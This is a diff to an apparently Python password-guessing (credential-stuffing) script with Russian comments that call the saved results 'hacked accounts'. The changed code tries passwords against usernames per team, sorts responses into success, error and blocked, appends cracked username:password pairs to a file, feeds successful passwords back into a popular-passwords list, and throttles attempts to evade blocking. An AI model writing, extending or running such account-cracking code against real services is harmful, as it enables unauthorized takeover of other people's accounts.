@@ -32,21 +32,27 @@ def start(password, team):
 
         if str(r) == f"<Response [{str(OK_RESPONSE)}]>":
             print(green + f"{get_ts()} {r}, {username}: {password}")
-
-        elif str(r) == f"<Response [{str(ERROR_RESPONSE)}]>":
-            print(white + f"{get_ts()} {r}, {username}: {password}")
-
-        elif str(r) == f"<Response [{str(BLOCKED_RESPONSE)}]>":
-            print(red + f"{get_ts()} {r}, {username}: {password}")
-        k += 1
-
-        if str(r) == f"<Response [{OK_RESPONSE}]>":
-            with open(f"{CHECKING_PATH}/{team}.txt", "a", encoding="utf-8") as h_list: # сохраняем в файл взломанные акки
-                h_list.write(f"{get_ts()} {username}: {password} \n")
+            with open(f"{CHECKING_PATH}/{team}.txt", "a", encoding="utf-8") as h_list:  # сохраняем акк
+                h_list.write(f"{get_ts()} {r} {username}: {password} \n")
 
             with open(f"{PASSWORDS_POPULAR_PATH}", "a",
                       encoding="utf-8") as mb_list:  # сохраняем взломанный пароль в пароли типа МБ
                 mb_list.write(f"{password} \n")
+
+        elif str(r) == f"<Response [{str(ERROR_RESPONSE)}]>":
+            print(yellow + f"{get_ts()} {r}, {username}: {password}")
+
+            if SAVE_EVERYTHING_CHECK:
+                with open(f"{CHECKING_PATH}/{team}.txt", "a", encoding="utf-8") as h_list:  # сохраняем акк
+                    h_list.write(f"{get_ts()} {r} {username}: {password} \n")
+
+        elif str(r) == f"<Response [{str(BLOCKED_RESPONSE)}]>":
+            print(red + f"{get_ts()} {r}, {username}: {password}")
+
+            if SAVE_EVERYTHING_CHECK:
+                with open(f"{CHECKING_PATH}/{team}.txt", "a", encoding="utf-8") as h_list:  # сохраняем акк
+                    h_list.write(f"{get_ts()} {r} {username}: {password} \n")
+        k += 1
 
         time.sleep(5)
         if k % 10 == 0:
